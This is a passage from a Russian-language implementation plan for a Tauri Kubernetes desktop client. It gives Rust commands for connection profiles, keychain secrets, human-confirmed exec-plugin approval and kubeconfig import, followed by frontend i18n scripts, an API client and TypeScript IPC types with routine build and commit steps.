use crate::k8s::connectivity::{TestReport, ensure_allowed};
use crate::secrets::{CLIENT_KEY, OverlayStore, SecretStore, TOKEN, secret_key};
use crate::state::AppState;
use crate::storage::profile::{AuthConfig, ConnectionProfile};

/// Секреты из формы. Для каждого: нет или `null` — оставить сохранённый, `""` — удалить,
/// иное — сохранить.
#[derive(Debug, Default, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SecretsInput {
    #[serde(default)]
    pub token: Option<String>,
    #[serde(default)]
    pub client_key: Option<String>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ConnectionInput {
    pub profile: ConnectionProfile,
    #[serde(default)]
    pub secrets: SecretsInput,
    /// Человек подтвердил строку запуска exec-плагина в форме (спец. §5.2). Подтверждение
    /// из самого профиля не принимается.
    #[serde(default)]
    pub confirm_exec: bool,
}

/// Подтверждение строки запуска: новое — по согласию в форме, иначе — прежнее сохранённое
/// (изменённая строка с ним уже не совпадёт).
fn set_exec_approval(
    profile: &mut ConnectionProfile,
    previous: Option<&ConnectionProfile>,
    confirm: bool,
) {
    if let AuthConfig::Exec(e) = &mut profile.auth {
        e.approved = if confirm {
            Some(crate::auth::exec::fingerprint(e))
        } else {
            previous.and_then(|p| match &p.auth {
                AuthConfig::Exec(old) => old.approved.clone(),
                _ => None,
            })
        };
    }
}

/// Что сделать с секретом при сохранении.
#[derive(Debug, PartialEq, Eq)]
enum SecretOp {
    Keep,
    Set(String),
    Delete,
}

/// Используемые профилем секреты — по данным формы, неиспользуемые — удаляются.
fn secret_ops(profile: &ConnectionProfile, s: &SecretsInput) -> [(&'static str, SecretOp); 2] {
    let op = |used: bool, v: Option<&String>| match (used, v.map(|x| x.trim())) {
        (false, _) => SecretOp::Delete,
        (true, None) => SecretOp::Keep,
        (true, Some("")) => SecretOp::Delete,
        (true, Some(v)) => SecretOp::Set(v.to_string()),
    };
    [
        (TOKEN, op(profile.auth.uses_token(), s.token.as_ref())),
        (
            CLIENT_KEY,
            op(
                matches!(profile.auth, AuthConfig::ClientCert { .. }),
                s.client_key.as_ref(),
            ),
        ),
    ]
}

#[tauri::command]
pub fn list_connections(state: State<'_, AppState>) -> AppResult<Vec<ConnectionProfile>> {
    Ok(state.connections.list())
}

#[tauri::command]
pub async fn save_connection(
    state: State<'_, AppState>,
    input: ConnectionInput,
) -> AppResult<ConnectionProfile> {
    let st = state.inner().clone();
    blocking(move || save_connection_blocking(&st, input)).await
}

/// Сохраняет профиль и секреты согласованно: если keychain не принял изменение, профиль
/// возвращается к прежнему состоянию (или удаляется, если он новый).
pub fn save_connection_blocking(
    st: &AppState,
    input: ConnectionInput,
) -> AppResult<ConnectionProfile> {
    let ConnectionInput {
        mut profile,
        secrets,
        confirm_exec,
    } = input;
    ensure_allowed(&profile, &st.policy.status)?;
    if profile.id.is_empty() {
        profile.id = uuid::Uuid::new_v4().to_string();
    }
    let previous = st.connections.get(&profile.id).ok();
    set_exec_approval(&mut profile, previous.as_ref(), confirm_exec);
    // upsert проверяет профиль — секреты трогаем только после успешного сохранения.
    let saved = st.connections.upsert(profile)?;
    let result = secret_ops(&saved, &secrets)
        .into_iter()
        .try_for_each(|(field, op)| {
            let key = secret_key(&saved.id, field);
            match op {
                SecretOp::Keep => Ok(()),
                SecretOp::Set(v) => st.secrets.set(&key, &v),
                SecretOp::Delete => st.secrets.delete(&key),
            }
        });
    if let Err(e) = result {
        let rollback = match previous {
            Some(p) => st.connections.upsert(p).map(|_| ()),
            None => st.connections.delete(&saved.id),
        };
        if let Err(r) = rollback {
            tracing::error!("failed to roll back profile {}: {r}", saved.id);
        }
        return Err(e);
    }
    // Клиент работает со старыми адресом и учётными данными: следующий вызов подключится заново.
    st.evict_connection(&saved.id);
    Ok(saved)
}

#[tauri::command]
pub async fn delete_connection(state: State<'_, AppState>, id: String) -> AppResult<()> {
    let st = state.inner().clone();
    st.logins.cancel(&id);
    blocking(move || st.delete_connection_full(&id)).await
}

/// Проверяет и несохранённый профиль: секреты из формы накладываются поверх keychain
/// (с той же семантикой, что и при сохранении). Ожидание exec-плагина отменяет
/// `cancel_oauth_login`.
#[tauri::command]
pub async fn test_connection(
    state: State<'_, AppState>,
    input: ConnectionInput,
) -> AppResult<TestReport> {
    let mut input = input;
    let previous = state.connections.get(&input.profile.id).ok();
    set_exec_approval(&mut input.profile, previous.as_ref(), input.confirm_exec);
    let id = input.profile.id.clone();
    let mut overrides = HashMap::new();
    for (field, v) in [
        (TOKEN, &input.secrets.token),
        (CLIENT_KEY, &input.secrets.client_key),
    ] {
        if let Some(v) = v {
            overrides.insert(secret_key(&id, field), v.trim().to_string());
        }
    }
    let secrets: Arc<dyn SecretStore> = Arc::new(OverlayStore {
        base: state.secrets.clone(),
        overrides,
    });
    let exec = matches!(input.profile.auth, AuthConfig::Exec(_));
    let (n, cancel) = match exec.then(|| state.logins.begin(&id)) {
        Some((n, rx)) => (Some(n), rx),
        None => (None, tokio::sync::oneshot::channel().1),
    };
    let report = crate::k8s::connectivity::test_connection(
        &input.profile,
        secrets,
        &state.policy.status,
        cancel,
    )
    .await;
    if let Some(n) = n {
        state.logins.finish(&id, n);
    }
    Ok(report)
}

/// Подключается (или берёт клиент из пула) и возвращает сведения о подключении.
/// `fresh` — подключиться заново (после входа или смены токена).
#[tauri::command]
pub async fn connect(
    state: State<'_, AppState>,
    connection_id: String,
    fresh: bool,
) -> AppResult<ConnectionInfo> {
    let st = state.inner().clone();
    ensure_allowed(&st.connections.get(&connection_id)?, &st.policy.status)?;
    match st.connected(&connection_id, fresh).await {
        Ok(c) => Ok(c.info.clone()),
        Err(e) => {
            st.evict_if_broken(&connection_id, &e);
            Err(e)
        }
    }
}

#[tauri::command]
pub fn disconnect(state: State<'_, AppState>, connection_id: String) -> AppResult<()> {
    state.evict_connection(&connection_id);
    Ok(())
}

/// Сохраняет вставленный токен (кнопка «Вставить токен» при истёкшей сессии).
#[tauri::command]
pub async fn set_connection_token(
    state: State<'_, AppState>,
    connection_id: String,
    token: String,
) -> AppResult<()> {
    let st = state.inner().clone();
    blocking(move || set_token_blocking(&st, &connection_id, &token)).await
}

pub fn set_token_blocking(st: &AppState, id: &str, token: &str) -> AppResult<()> {
    let p = st.connections.get(id)?;
    if !p.auth.uses_token() {
        return Err(app_err!(
            crate::error::ErrorCode::InvalidInput,
            "errors.connections.tokenNotUsed",
            "This connection does not sign in with a token"
        ));
    }
    st.secrets.set(&secret_key(id, TOKEN), token.trim())?;
    st.evict_connection(id);
    Ok(())
}
````

<!-- block: file t12-src-tauri-src-commands-kubeconfig-rs-impl step=12.2 path=src-tauri/src/commands/kubeconfig.rs part=impl -->
````rust
use std::path::{Path, PathBuf};

use tauri::State;

use super::blocking;
use super::connections::{ConnectionInput, SecretsInput, save_connection_blocking};
use crate::error::{AppResult, ErrorCode};
use crate::k8s::config::process_env;
use crate::k8s::kubeconfig::{self, KubeconfigPreview};
use crate::state::AppState;
use crate::storage::profile::{AuthConfig, ConnectionProfile};

fn resolve_path(path: Option<String>) -> AppResult<PathBuf> {
    match path.filter(|p| !p.trim().is_empty()) {
        Some(p) => Ok(PathBuf::from(p)),
        None => kubeconfig::default_path(&process_env, dirs::home_dir()).ok_or_else(|| {
            app_err!(
                ErrorCode::InvalidInput,
                "errors.kubeconfig.noDefault",
                "Cannot find the default kubeconfig — choose a file"
            )
        }),
    }
}

/// Контексты kubeconfig (`path` или файл по умолчанию) для выбора в диалоге импорта.
#[tauri::command]
pub async fn preview_kubeconfig_import(
    state: State<'_, AppState>,
    path: Option<String>,
) -> AppResult<KubeconfigPreview> {
    let st = state.inner().clone();
    let dirs = crate::auth::exec::command_dirs().await;
    blocking(move || preview_blocking(&st, &resolve_path(path)?, &dirs)).await
}

/// Команды exec-плагинов ищутся в `dirs` (PATH оболочки входа и стандартные каталоги).
fn preview_blocking(st: &AppState, path: &Path, dirs: &[PathBuf]) -> AppResult<KubeconfigPreview> {
    let kc = kubeconfig::read(path)?;
    let resolve = |cmd: &str, base: Option<&Path>| {
        crate::auth::exec::resolve_command(cmd, base, dirs, &|p| p.is_file())
    };
    Ok(kubeconfig::preview(
        &kc,
        path,
        &st.connections.list(),
        &st.policy.status,
        &resolve,
    ))
}

/// Импортирует выбранные контексты: новые — в папку `folder_id`, совпавшие обновляются.
/// Строка запуска exec-плагина подтверждена, только если контекст есть в `approve_exec`.
#[tauri::command]
pub async fn apply_kubeconfig_import(
    state: State<'_, AppState>,
    path: String,
    contexts: Vec<String>,
    folder_id: Option<String>,
    approve_exec: Vec<String>,
) -> AppResult<Vec<ConnectionProfile>> {
    let st = state.inner().clone();
    let dirs = crate::auth::exec::command_dirs().await;
    blocking(move || {
        let request = ApplyRequest {
            path: Path::new(&path),
            names: &contexts,
            folder_id,
            approve_exec: &approve_exec,
            dirs: &dirs,
        };
        apply_blocking(&st, request)
    })
    .await
}

/// Что импортировать: файл, контексты, папка для новых, подтверждённые exec-плагины.
struct ApplyRequest<'a> {
    path: &'a Path,
    names: &'a [String],
    folder_id: Option<String>,
    approve_exec: &'a [String],
    dirs: &'a [PathBuf],
}

/// Обновлённое подключение сохраняет своё имя, окружение, цвет, флаг «только чтение» и место
/// в дереве; из kubeconfig берутся адрес, вход, CA, прокси и проект контекста.
fn merge(existing: ConnectionProfile, imported: ConnectionProfile) -> ConnectionProfile {
    let mut favorites = existing.favorite_namespaces.clone();
    favorites.extend(imported.favorite_namespaces);
    ConnectionProfile {
        api_url: imported.api_url,
        auth: imported.auth,
        ca: imported.ca,
        tls_server_name: imported.tls_server_name,
        proxy: imported.proxy,
        favorite_namespaces: favorites,
        ..existing
    }
}

fn apply_blocking(st: &AppState, r: ApplyRequest) -> AppResult<Vec<ConnectionProfile>> {
    let kc = kubeconfig::read(r.path)?;
    let preview = preview_blocking(st, r.path, r.dirs)?;
    let (names, folder_id) = (r.names, r.folder_id);
    let mut saved = Vec::new();
    for name in names {
        let Some(ctx) = preview.contexts.iter().find(|c| &c.name == name) else {
            return Err(app_err!(
                ErrorCode::NotFound,
                "errors.kubeconfig.noContext",
                "Context “{{name}}” not found in kubeconfig",
                name = name
            ));
        };
        let imported = kubeconfig::import_context(&kc, name, ctx)?;
        let confirm_exec =
            matches!(imported.profile.auth, AuthConfig::Exec(_)) && r.approve_exec.contains(name);
        let profile = match st.connections.get(&imported.profile.id) {
            Ok(existing) => merge(existing, imported.profile),
            Err(_) => ConnectionProfile {
                folder_id: folder_id.clone(),
                ..imported.profile
            },
        };
        // Пустая строка удаляет секрет, который этот способ входа не использует.
        let secrets = SecretsInput {
            token: Some(imported.token.unwrap_or_default()),
            client_key: Some(imported.client_key.unwrap_or_default()),
        };
        saved.push(save_connection_blocking(
            st,
            ConnectionInput {
                profile,
                secrets,
                confirm_exec,
            },
        )?);
    }
    Ok(saved)
}
````

<!-- block: patch t12-src step=12.2 -->
````diff
diff --git a/src-tauri/src/commands/mod.rs b/src-tauri/src/commands/mod.rs
--- a/src-tauri/src/commands/mod.rs
+++ b/src-tauri/src/commands/mod.rs
@@ -1,4 +1,7 @@
+pub mod auth;
+pub mod connections;
 pub mod folders;
+pub mod kubeconfig;
 pub mod settings;
 
 use crate::error::{AppResult, ErrorCode};
diff --git a/src-tauri/src/lib.rs b/src-tauri/src/lib.rs
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -43,6 +43,19 @@ pub fn run() {
             Ok(())
         })
         .invoke_handler(tauri::generate_handler![
+            commands::connections::list_connections,
+            commands::connections::save_connection,
+            commands::connections::delete_connection,
+            commands::connections::test_connection,
+            commands::connections::connect,
+            commands::connections::disconnect,
+            commands::connections::set_connection_token,
+            commands::auth::start_oauth_login,
+            commands::auth::cancel_oauth_login,
+            commands::auth::oauth_token_page,
+            commands::auth::resolve_exec_command,
+            commands::kubeconfig::preview_kubeconfig_import,
+            commands::kubeconfig::apply_kubeconfig_import,
             commands::folders::list_folders,
             commands::folders::create_folder,
             commands::folders::rename_folder,
````

Применить: `python3 /tmp/o1a-blocks.py step 12.2`.

- [ ] **Step 3: Проверки.**

Run: `cargo test --manifest-path src-tauri/Cargo.toml --lib`  
Expected: PASS — `test result: ok. 182 passed; 0 failed`

Run: `cargo clippy --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings`  
Expected: PASS — без предупреждений

Run: `cargo fmt --manifest-path src-tauri/Cargo.toml --check`  
Expected: PASS — без изменений

- [ ] **Step 4: Commit.**

```bash
git add -A
git commit -s -m "feat(commands): подключения, проверка, вход через браузер и exec-плагином, импорт kubeconfig" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

### Task 13: Основа фронтенда: i18n, словари en и ru, API-клиент, общие компоненты

**Files:**
- Port: `scripts/i18n-check.mjs` (с правками), `scripts/i18n-check.test.mjs`, `src/components/common/EnvBadge.tsx`, `src/components/common/ErrorBanner.test.tsx` (с правками), `src/components/common/ErrorBanner.tsx`, `src/components/common/Hint.test.tsx`, `src/components/common/Hint.tsx`, `src/i18n/documentLang.test.ts`, `src/i18n/index.ts`, `src/i18n/locales.test.ts`, `src/i18n/text.test.ts`, `src/i18n/text.ts`, `src/lib/activate.test.tsx`, `src/lib/activate.ts`, `src/lib/env.ts`, `src/lib/focusTrap.ts`, `src/lib/format.test.ts`, `src/lib/format.ts`, `src/lib/formatAgo.ts`, `src/lib/links.ts` (с правками), `src/lib/plainInputs.test.ts`, `src/lib/plainInputs.ts`, `src/lib/useDebouncedValue.test.ts`, `src/lib/useDebouncedValue.ts`, `src/lib/useLanguageSync.ts`, `src/test/render.tsx`
- Create: `docs/guide/en/.gitkeep`, `docs/guide/ru/.gitkeep`, `docs/i18n/same-as-en.json`, `scripts/merge-locales.mjs`, `scripts/merge-locales.test.mjs`, `src/api/client.ts`, `src/api/types.ts`, `src/i18n/languages.ts`
- Modify: `PORTED.md`, `package.json`, `src/App.test.tsx`, `src/App.tsx`, `src/locales/en.json`, `src/locales/ru.json`, `src/main.tsx`, `src/test/setup.ts`

**Interfaces:**
- Consumes: команды задач 3, 4, 12.
- Produces: `src/api/types.ts` (`ErrorCode`, `LocalizedText`, `AppError`, `Environment`, `ExecEnv`, `ExecAuth`, `AuthConfig` (в том числе `{ method: "exec" } & ExecAuth`), `CaConfig`, `ProxyConfig`, `ConnectionProfile`, `SecretsInput`, `ConnectionFolder`, `ImportPreview { …, needsSecrets }`, `TestStepName` (с `exec`), `TestStep`, `TestReport`, `Capabilities`, `PlatformKind`, `Distribution`, `PlatformInfo`, `ApiGroups`, `ConnectionInfo { user, groups, serverVersion, platform, apiGroups, capabilities }`, `ImportAuth`, `KubeContext { …, exec }`, `KubeconfigPreview`, `PolicyStatus { …, allowInsecureTls, allowExecAuth }`, `AppInfo`, `LanguageSettings`); `src/api/client.ts` — `api.{getAppInfo, getLanguageSettings, setLanguage, getPolicyStatus, listConnections, saveConnection(profile, secrets, confirmExec), deleteConnection, testConnection(profile, secrets, confirmExec), connect(id, fresh), disconnect, setConnectionToken, startOauthLogin, cancelOauthLogin, oauthTokenPage, resolveExecCommand, previewKubeconfigImport(path | null), applyKubeconfigImport(path, contexts, folderId, approveExec), listFolders, createFolder, renameFolder, deleteFolder, moveItems, exportConnections, previewImport, applyImport}`, `toAppError`; `node scripts/merge-locales.mjs < фрагмент.json`.

Переносятся i18n (`index.ts`, `text.ts`), `lib/*`, тестовые помощники, `ErrorBanner`, `Hint`, `EnvBadge` и проверка `scripts/i18n-check.mjs` (глав руководства пока нет — `GUIDE_CHAPTERS = []`, каталоги `docs/guide/{en,ru}` созданы пустыми). Типы IPC и клиент `api` пишутся под команды O1a, включая exec-плагин (`ExecAuth`), платформу (`PlatformInfo`, `ApiGroups`) и `allowExecAuth`. Словари создаются фрагментами скриптом `scripts/merge-locales.mjs` (он отказывается молча перезаписать существующий ключ): сразу все 109 ключей Rust из задач 2–12, общие строки и `hints.label`. Тест `ErrorBanner` использует ключи и коды этого приложения.

- [ ] **Step 1: Перенос из Kafka-версии.**

Файлы копируются с коммита `8bbd0bd` и правятся патчами (правки — против перенесённого файла).

<!-- block: shell t13-port step=13.1 -->
````bash
scripts/port.sh scripts/i18n-check.mjs scripts/i18n-check.mjs
scripts/port.sh scripts/i18n-check.test.mjs scripts/i18n-check.test.mjs
scripts/port.sh src/components/common/EnvBadge.tsx src/components/common/EnvBadge.tsx
scripts/port.sh src/components/common/ErrorBanner.test.tsx src/components/common/ErrorBanner.test.tsx
scripts/port.sh src/components/common/ErrorBanner.tsx src/components/common/ErrorBanner.tsx
scripts/port.sh src/components/common/Hint.test.tsx src/components/common/Hint.test.tsx
scripts/port.sh src/components/common/Hint.tsx src/components/common/Hint.tsx
scripts/port.sh src/i18n/documentLang.test.ts src/i18n/documentLang.test.ts
scripts/port.sh src/i18n/index.ts src/i18n/index.ts
scripts/port.sh src/i18n/locales.test.ts src/i18n/locales.test.ts
scripts/port.sh src/i18n/text.test.ts src/i18n/text.test.ts
scripts/port.sh src/i18n/text.ts src/i18n/text.ts
scripts/port.sh src/lib/activate.test.tsx src/lib/activate.test.tsx
scripts/port.sh src/lib/activate.ts src/lib/activate.ts
scripts/port.sh src/lib/env.ts src/lib/env.ts
scripts/port.sh src/lib/focusTrap.ts src/lib/focusTrap.ts
scripts/port.sh src/lib/format.test.ts src/lib/format.test.ts
scripts/port.sh src/lib/format.ts src/lib/format.ts
scripts/port.sh src/lib/formatAgo.ts src/lib/formatAgo.ts
scripts/port.sh src/lib/links.ts src/lib/links.ts
scripts/port.sh src/lib/plainInputs.test.ts src/lib/plainInputs.test.ts
scripts/port.sh src/lib/plainInputs.ts src/lib/plainInputs.ts
scripts/port.sh src/lib/useDebouncedValue.test.ts src/lib/useDebouncedValue.test.ts
scripts/port.sh src/lib/useDebouncedValue.ts src/lib/useDebouncedValue.ts
scripts/port.sh src/lib/useLanguageSync.ts src/lib/useLanguageSync.ts
scripts/port.sh src/test/render.tsx src/test/render.tsx
````

<!-- block: patch t13-port-scripts-i18n-check-mjs step=13.1 -->
````diff
diff --git a/scripts/i18n-check.mjs b/scripts/i18n-check.mjs
--- a/scripts/i18n-check.mjs
+++ b/scripts/i18n-check.mjs
@@ -560,7 +560,8 @@ export function findRustCyrillic(files) {
   return hits;
 }
 
-export const GUIDE_CHAPTERS = ["getting-started", "connections", "topics", "browse", "producer", "groups", "consumer-sessions", "health-check", "llm-mcp", "updates", "troubleshooting"];
+/** Главы руководства (этап O1 пишет первые; список растёт вместе с `src/guide/chapters.ts`). */
+export const GUIDE_CHAPTERS = [];
 
 const KEBAB = /^[a-z0-9]+(?:-[a-z0-9]+)*$/;
 
````

<!-- block: patch t13-port-src-components-common-errorbanner-test-tsx step=13.1 -->
````diff
diff --git a/src/components/common/ErrorBanner.test.tsx b/src/components/common/ErrorBanner.test.tsx
--- a/src/components/common/ErrorBanner.test.tsx
+++ b/src/components/common/ErrorBanner.test.tsx
@@ -7,15 +7,15 @@ describe("ErrorBanner", () => {
     render(
       <ErrorBanner
         error={{
-          code: "READ_ONLY",
-          key: "errors.guard.readOnly",
-          params: { name: "prod-1" },
-          message: "Connection “prod-1” is read-only",
+          code: "FORBIDDEN",
+          key: "errors.k8s.forbiddenIn",
+          params: { verb: "list", resource: "pods", namespace: "team-a" },
+          message: "Not allowed: list pods in project “team-a”",
           retryable: false,
         }}
       />,
     );
-    expect(screen.getByText("Подключение «prod-1» открыто только для чтения")).toBeInTheDocument();
+    expect(screen.getByText("Нет прав: list pods в проекте «team-a»")).toBeInTheDocument();
   });
 
   it("errors.generic показывает исходный текст как есть", () => {
@@ -41,8 +41,8 @@ describe("ErrorBanner", () => {
   });
 
   it("ошибка без ключа (старый формат) — message", () => {
-    render(<ErrorBanner error={{ code: "GROUP_NOT_EMPTY", message: "Группа не пуста", retryable: false }} />);
-    expect(screen.getByText("Группа не пуста")).toBeInTheDocument();
-    expect(screen.getByText("(GROUP_NOT_EMPTY)")).toBeInTheDocument();
+    render(<ErrorBanner error={{ code: "CONFLICT", message: "Объект изменён", retryable: false }} />);
+    expect(screen.getByText("Объект изменён")).toBeInTheDocument();
+    expect(screen.getByText("(CONFLICT)")).toBeInTheDocument();
   });
 });
````

<!-- block: patch t13-port-src-lib-links-ts step=13.1 -->
````diff
diff --git a/src/lib/links.ts b/src/lib/links.ts
--- a/src/lib/links.ts
+++ b/src/lib/links.ts
@@ -1,9 +1,9 @@
 import { openUrl } from "@tauri-apps/plugin-opener";
 
 /** Страница поддержки проекта — один адрес на все входы: низ левой панели, «О программе», меню Help. */
-export const SUPPORT_URL = "https://github.com/vvnovg/glafira-kafka-releases/blob/main/SUPPORT.md";
+export const SUPPORT_URL = "https://github.com/vvnovg/glafira-kubernetes-releases/blob/main/SUPPORT.md";
 /** Текст лицензии Apache 2.0 в репозитории исходного кода. */
-export const LICENSE_URL = "https://github.com/vvnovg/glafira-kafka/blob/main/LICENSE";
+export const LICENSE_URL = "https://github.com/vvnovg/glafira-kubernetes/blob/main/LICENSE";
 
 /** Открывает страницу поддержки в системном браузере. */
 export function openSupport(): void {
````

Применить: `python3 /tmp/o1a-blocks.py step 13.1`.

- [ ] **Step 2: Тесты.**

<!-- block: file t13-scripts-merge-locales-test-mjs step=13.2 path=scripts/merge-locales.test.mjs -->
````js
import assert from "node:assert/strict";
import { test } from "node:test";
import { deepMerge } from "./merge-locales.mjs";

test("сливает вглубь и не перезаписывает без --replace", () => {
  const base = { common: { save: "Save" } };
  assert.deepEqual(deepMerge(base, { common: { cancel: "Cancel" }, tabs: { help: "Help" } }), []);
  assert.deepEqual(base, { common: { save: "Save", cancel: "Cancel" }, tabs: { help: "Help" } });
  assert.deepEqual(deepMerge(base, { common: { save: "Store" } }), ["common.save: «Save» → «Store»"]);
  assert.equal(base.common.save, "Save");
  assert.deepEqual(deepMerge(base, { common: { save: "Store" } }, true), []);
  assert.equal(base.common.save, "Store");
  assert.deepEqual(deepMerge(base, { common: { save: "Store" } }), [], "то же значение — не конфликт");
  assert.deepEqual(deepMerge(base, { common: { save: { x: "y" } } }), ["common.save: строка → объект"]);
});
````

<!-- block: patch t13-tests step=13.2 -->
````diff
diff --git a/src/App.test.tsx b/src/App.test.tsx
--- a/src/App.test.tsx
+++ b/src/App.test.tsx
@@ -1,4 +1,10 @@
 import { render, screen } from "@testing-library/react";
+import { vi } from "vitest";
+
+vi.mock("./api/client", () => ({
+  api: { getLanguageSettings: vi.fn(() => new Promise(() => {})) },
+}));
+
 import App from "./App";
 
 test("показывает имя продукта", () => {
````

Применить: `python3 /tmp/o1a-blocks.py step 13.2`.

- [ ] **Step 3: Реализация.**

<!-- block: shell t13-empty step=13.3 -->
````bash
mkdir -p docs/guide/en && : > docs/guide/en/.gitkeep
mkdir -p docs/guide/ru && : > docs/guide/ru/.gitkeep
````

<!-- block: file t13-docs-i18n-same-as-en-json step=13.3 path=docs/i18n/same-as-en.json -->
````json
{
  "ru": []
}
````

<!-- block: file t13-scripts-merge-locales-mjs step=13.3 path=scripts/merge-locales.mjs -->
````js
#!/usr/bin/env node
// Добавляет строки в словари: JSON вида {"en": {...}, "ru": {...}} из stdin сливается вглубь с
// src/locales/<код>.json. Ключ с другим значением — ошибка (защита от случайной перезаписи);
// заменить значение — флаг --replace. Только модули node:.
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { fileURLToPath } from "node:url";

/** Сливает `add` в `base`; возвращает список конфликтов «путь: было → стало». */
export function deepMerge(base, add, replace = false, prefix = "", conflicts = []) {
  for (const [k, v] of Object.entries(add)) {
    const path = prefix ? `${prefix}.${k}` : k;
    if (v && typeof v === "object") {
      if (base[k] !== undefined && (typeof base[k] !== "object" || base[k] === null)) conflicts.push(`${path}: строка → объект`);
      else deepMerge((base[k] ??= {}), v, replace, path, conflicts);
    } else if (base[k] !== undefined && base[k] !== v && !replace) conflicts.push(`${path}: «${base[k]}» → «${v}»`);
    else base[k] = v;
  }
  return conflicts;
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  const replace = process.argv.includes("--replace");
  const input = JSON.parse(readFileSync(0, "utf8"));
  const problems = [];
  const merged = {};
  for (const [code, add] of Object.entries(input)) {
    const file = join(process.cwd(), "src/locales", `${code}.json`);
    const dict = existsSync(file) ? JSON.parse(readFileSync(file, "utf8")) : {};
    problems.push(...deepMerge(dict, add, replace).map((c) => `${code}: ${c}`));
    merged[file] = dict;
  }
  if (problems.length) {
    console.error(problems.map((p) => `✗ ${p}`).join("\n"));
    process.exit(1);
  }
  mkdirSync(join(process.cwd(), "src/locales"), { recursive: true });
  for (const [file, dict] of Object.entries(merged)) writeFileSync(file, `${JSON.stringify(dict, null, 2)}\n`);
  console.log(`✓ словари обновлены: ${Object.keys(input).join(", ")}`);
}
````

<!-- block: file t13-src-api-client-ts step=13.3 path=src/api/client.ts -->
````ts
import { invoke } from "@tauri-apps/api/core";
import type {
  AppError,
  AppInfo,
  ConnectionFolder,
  ConnectionInfo,
  ConnectionProfile,
  ExportSummary,
  ImportPreview,
  KubeconfigPreview,
  LanguageSettings,
  PolicyStatus,
  SecretsInput,
  TestReport,
  TreeItemRef,
} from "./types";

export function isAppError(e: unknown): e is AppError {
  return typeof e === "object" && e !== null && "code" in e && "message" in e;
}

export function toAppError(e: unknown): AppError {
  // Ошибка из Rust приходит целиком: key/params/details сохраняются как есть.
  if (isAppError(e)) return e;
  if (e instanceof Error) return { code: "INTERNAL", message: e.message, retryable: false };
  return { code: "INTERNAL", message: String(e), retryable: false };
}

async function call<T>(cmd: string, args?: Record<string, unknown>): Promise<T> {
  try {
    return await invoke<T>(cmd, args);
  } catch (e) {
    throw toAppError(e);
  }
}

export const api = {
  getAppInfo: () => call<AppInfo>("get_app_info"),
  getLanguageSettings: () => call<LanguageSettings>("get_language_settings"),
  setLanguage: (lang: string | null) => call<LanguageSettings>("set_language", { lang }),
  getPolicyStatus: () => call<PolicyStatus>("get_policy_status"),

  listConnections: () => call<ConnectionProfile[]>("list_connections"),
  /** `confirmExec` — человек подтвердил строку запуска exec-плагина в форме. */
  saveConnection: (profile: ConnectionProfile, secrets: SecretsInput = {}, confirmExec = false) =>
    call<ConnectionProfile>("save_connection", { input: { profile, secrets, confirmExec } }),
  deleteConnection: (id: string) => call<void>("delete_connection", { id }),
  testConnection: (profile: ConnectionProfile, secrets: SecretsInput = {}, confirmExec = false) =>
    call<TestReport>("test_connection", { input: { profile, secrets, confirmExec } }),
  connect: (connectionId: string, fresh = false) => call<ConnectionInfo>("connect", { connectionId, fresh }),
  disconnect: (connectionId: string) => call<void>("disconnect", { connectionId }),
  setConnectionToken: (connectionId: string, token: string) =>
    call<void>("set_connection_token", { connectionId, token }),
  startOauthLogin: (connectionId: string) => call<ConnectionInfo>("start_oauth_login", { connectionId }),
  /** Отменяет вход через браузер или ожидание exec-плагина. */
  cancelOauthLogin: (connectionId: string) => call<boolean>("cancel_oauth_login", { connectionId }),
  oauthTokenPage: (connectionId: string) => call<string>("oauth_token_page", { connectionId }),
  resolveExecCommand: (command: string) => call<string>("resolve_exec_command", { command }),
  previewKubeconfigImport: (path: string | null) => call<KubeconfigPreview>("preview_kubeconfig_import", { path }),
  /** `approveExec` — контексты, строку запуска exec-плагина которых подтвердил человек. */
  applyKubeconfigImport: (path: string, contexts: string[], folderId: string | null, approveExec: string[] = []) =>
    call<ConnectionProfile[]>("apply_kubeconfig_import", { path, contexts, folderId, approveExec }),

  listFolders: () => call<ConnectionFolder[]>("list_folders"),
  createFolder: (name: string, parentId: string | null) =>
    call<ConnectionFolder>("create_folder", { name, parentId }),
  renameFolder: (id: string, name: string) => call<ConnectionFolder>("rename_folder", { id, name }),
  deleteFolder: (id: string) => call<void>("delete_folder", { id }),
  moveItems: (items: TreeItemRef[], parentId: string | null, before: TreeItemRef | null) =>
    call<void>("move_items", { items, parentId, before }),
  exportConnections: (path: string, folderId: string | null) =>
    call<ExportSummary>("export_connections", { path, folderId }),
  previewImport: (path: string, targetFolderId: string | null, updateExisting: boolean) =>
    call<ImportPreview>("preview_import", { path, targetFolderId, updateExisting }),
  applyImport: (path: string, targetFolderId: string | null, updateExisting: boolean) =>
    call<ImportPreview>("apply_import", { path, targetFolderId, updateExisting }),
};
````

<!-- block: file t13-src-api-types-ts step=13.3 path=src/api/types.ts -->
````ts
// Типы IPC-контракта с Rust (спец. §4.2). Поля — camelCase, как сериализует serde.

export type ErrorCode =
  | "CONNECTION_FAILED"
  | "TLS_ERROR"
  | "AUTH_FAILED"
  | "SESSION_EXPIRED"
  | "FORBIDDEN"
  | "NOT_FOUND"
  | "CONFLICT"
  | "TIMEOUT"
  | "INVALID_INPUT"
  | "READ_ONLY"
  | "CONFIRMATION_REQUIRED"
  | "INTERNAL";

/** Текст из Rust: ключ словаря, параметры и английский текст (запасной вариант). */
export interface LocalizedText {
  key: string;
  params: Record<string, string>;
  text: string;
}

export interface AppError {
  code: ErrorCode;
  /** Ключ словаря; у технического текста без перевода — `errors.generic` с `params.message`. */
  key?: string;
  params?: Record<string, string>;
  /** Английский текст (запасной вариант перевода). */
  message: string;
  details?: string;
  retryable: boolean;
}

export type Environment = "local" | "dev" | "test" | "stage" | "prod";

export interface ExecEnv {
  name: string;
  value: string;
}

/** Exec-плагин (спец. §5.2): абсолютный путь к команде, аргументы, переменные окружения. */
export interface ExecAuth {
  command: string;
  args: string[];
  env: ExecEnv[];
  apiVersion: string;
  provideClusterInfo: boolean;
  /** Отпечаток подтверждённой строки запуска; ставит только Rust по согласию в форме или диалоге. */
  approved?: string | null;
}

export type AuthConfig =
  | { method: "token" }
  | { method: "browser" }
  | { method: "clientCert"; certificatePem: string }
  | ({ method: "exec" } & ExecAuth);
